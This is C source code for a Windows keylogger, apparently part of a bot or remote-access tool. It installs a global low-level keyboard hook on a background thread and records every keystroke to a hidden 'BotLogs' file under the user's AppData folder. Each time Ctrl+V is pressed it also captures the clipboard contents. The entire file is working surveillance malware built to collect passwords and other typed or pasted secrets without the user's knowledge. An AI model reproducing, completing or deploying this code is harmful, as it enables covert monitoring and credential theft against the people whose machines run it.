#include "header.h"

#define VK_V 0x056
#define KEY_BUFFER_SIZE 4
#define KEYBOARD_STATE_SIZE 256





/* The hook variable shared between the setter and the callback. */
HHOOK hook;

/*
 * hook_callback - The callback that is fired every time a new keyboard input
 * event is about to be posted into a thread input queue.
 * @code: A code the hook procedure uses to determine how to process the
 * message.
 * @wparam: The identifier of the keyboard message.
 * @lparam: A pointer to a KBDLLHOOKSTRUCT structure.
 *
 * Returns the hook procedure code.
 */

DWORD open_utf16_file(HANDLE* const file, const LPCWSTR name)
{
	DWORD rc;
	HANDLE handle = CreateFile(
		name, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL,
		OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (handle == INVALID_HANDLE_VALUE) {
		rc = GetLastError();
		goto out;
	}

	rc = ensure_utf16(handle);
out:
	*file = rc ? NULL : handle;
	return rc;
}

DWORD ensure_utf16(const HANDLE file)
{
	static const BYTE UTF16_MAGIC[] = { 0xFF, 0xFE };

	UCHAR buff[2];
	DWORD read;
	BOOL success = ReadFile(file, buff, 2, &read, NULL);

	if (!success)
		return GetLastError();

	if (!memcmp(buff, UTF16_MAGIC, 2)) {
		LARGE_INTEGER dist = { 0 };
		DWORD res = SetFilePointerEx(file, dist, NULL, FILE_END);

		return res != INVALID_SET_FILE_POINTER ? 0 : GetLastError();
	}

	DWORD count;
	success = WriteFile(file, UTF16_MAGIC, 2, &count, NULL);

	if (!success)
		return GetLastError();
	else if (count != 2)
		return 1;

	return 0;
}

DWORD write_wstr(const HANDLE file, const LPCWSTR content)
{
	DWORD buff_size = wcslen(content) * sizeof(content[0]);
	DWORD count;
	BOOL success = WriteFile(file, content, buff_size, &count, NULL);

	if (count != buff_size)
		return 1;

	return success ? 0 : GetLastError();
}


DWORD write_clipboard_data(const HANDLE file)
{
	DWORD rc = 1;

	if (!OpenClipboard(NULL))
		goto out;

	const HANDLE handle = GetClipboardData(CF_UNICODETEXT);

	if (!handle)
		goto close;

	const LPCVOID data = GlobalLock(handle);

	if (!data)
		goto close;

	rc = write_wstr(file, (LPCWSTR)data);
	GlobalUnlock(handle);
close:
	CloseClipboard();
out:
	return rc;
}


BOOL is_ignored(const DWORD vk_code)
{
	switch (vk_code) {
	case VK_LCONTROL:
	case VK_RCONTROL:
	case VK_CONTROL:
		return TRUE;
	default:
		return FALSE;
	}
}

LPCWSTR get_virtual_key_value(const DWORD vk_code)
{
	switch (vk_code) {
	case VK_RETURN:
		return L"\r\n";
	case VK_ESCAPE:
		return L"[ESC]";
	case VK_BACK:
		return L"[BACKSPACE]";
	default:
		return NULL;
	}
}

DWORD log_kbd(const KBDLLHOOKSTRUCT* const kbd_hook)
{
	if (is_ignored(kbd_hook->vkCode))
		return 1;

	static HANDLE out_file = NULL;

	DWORD rc = 0;

	if (!out_file) {
		wchar_t path[MAX_PATH];
		get_appdata_path(path, MAX_PATH);
		wcscat(path, L"\\BotLogs\\");
		wcscat(path, OUT_FILE);
		rc = open_utf16_file(&out_file, path);

		if (rc)
			return rc;
	}

	LPCWSTR vk_val = get_virtual_key_value(kbd_hook->vkCode);

	if (vk_val != NULL) {
		rc = write_wstr(out_file, vk_val);
	}
	else if (is_key_down(VK_CONTROL)) {
		WCHAR ctrl[] = L"[CTRL + %c]";
		swprintf_s(ctrl, ARRAYSIZE(ctrl), ctrl,
			(CHAR)kbd_hook->vkCode);
		rc = write_wstr(out_file, ctrl);

		if (!rc && kbd_hook->vkCode == VK_V)
			rc = write_clipboard_data(out_file);
	}
	else {
		WCHAR key_buff[KEY_BUFFER_SIZE];
		int count = kbd_to_unicode(kbd_hook, key_buff, KEY_BUFFER_SIZE);

		if (count > 0)
			rc = write_wstr(out_file, key_buff);
	}

	return rc;
}


LRESULT WINAPI hook_callback(const int code, const WPARAM wparam,
	const LPARAM lparam)
{
	/*
	 * If an action occurred and the keydown event was fired, log the
	 * respective characters of the KBD hook.
	 */
	if (code == HC_ACTION && wparam == WM_KEYDOWN)
		log_kbd((KBDLLHOOKSTRUCT*)lparam);

	return CallNextHookEx(hook, code, wparam, lparam);
}

BOOL set_keyboard_hook(VOID)
{
	hook = SetWindowsHookExW(WH_KEYBOARD_LL, hook_callback, NULL, 0);

	return hook != NULL;
}

void get_keyboard_state(BYTE* const buff, const SIZE_T size)
{
	for (SIZE_T i = 0; i < size; i++) {
		const SHORT key_state = GetKeyState(i);

		/*
		 * Right shifts the high order bit by 8 to avoid a narrowing
		 * conversion from SHORT to BYTE.
		 */
		buff[i] = (key_state >> 8) | (key_state & 1);
	}
}


BOOL is_key_down(const DWORD vk_code)
{
	/*
	 * Right shifts the high order bit by 15 to obtain the virtual key's
	 * up/down status.
	 */
	return GetKeyState(vk_code) >> 15;
}

int kbd_to_unicode(const KBDLLHOOKSTRUCT* const kbd_hook, const LPWSTR buff,
	const size_t size)
{
	BYTE state[KEYBOARD_STATE_SIZE];
	get_keyboard_state(state, KEYBOARD_STATE_SIZE);

	return ToUnicode(kbd_hook->vkCode, kbd_hook->scanCode, state, buff,
		size, 0);
}

unsigned __stdcall msg_loop_thread(void* param)
{
	if (!set_keyboard_hook())
		return -1;

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0));
	return 0;
}

int start_keylog()
{
	HANDLE hThread = CreateThread(NULL, NULL, msg_loop_thread, NULL, NULL, NULL);
	if (hThread == NULL) {
		bot_log("Failed to create keylogger thread.\n");
		return -1;
	}
	return 0;
}


